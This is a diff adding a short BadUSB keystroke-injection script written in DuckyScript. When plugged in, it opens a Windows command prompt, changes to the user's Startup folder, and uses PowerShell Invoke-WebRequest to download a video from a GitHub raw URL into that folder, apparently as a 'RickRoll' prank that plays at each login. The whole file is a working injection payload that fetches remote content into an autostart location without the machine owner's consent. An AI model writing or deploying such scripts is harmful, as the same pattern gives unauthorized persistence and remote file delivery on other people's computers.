@@ -1,0 +1,10 @@
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 3000
+STRING cd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+ENTER
+STRING Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/RickRoll.mp4 -OutFile .\RickRoll.mp4 && exit
+ENTER
